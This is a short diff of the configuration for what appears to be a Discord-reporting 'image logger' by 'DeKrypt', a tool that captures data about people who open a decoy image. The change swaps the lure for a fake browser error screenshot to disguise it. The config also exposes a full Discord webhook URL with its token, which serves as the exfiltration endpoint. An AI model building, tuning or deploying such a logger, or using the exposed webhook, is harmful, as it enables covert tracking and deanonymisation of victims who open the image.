@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335010179560771677/fz_GbDQLraHZluuzt4KXhkBgKbiwd3f9GEEYAWqkaB1SB110wBXdIke9FzQFFgx19NCu",
-    "image": "https://www.bugsfighter.com/wp-content/uploads/2022/12/google-meet-error-502.png", # You can also have a custom image by using a URL argument
+    "image": "https://www.online-tech-tips.com/wp-content/uploads/2022/12/how-to-fix-the-this-site-cant-be-reached-error-in-google-chrome-1-compressed-1024x512.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
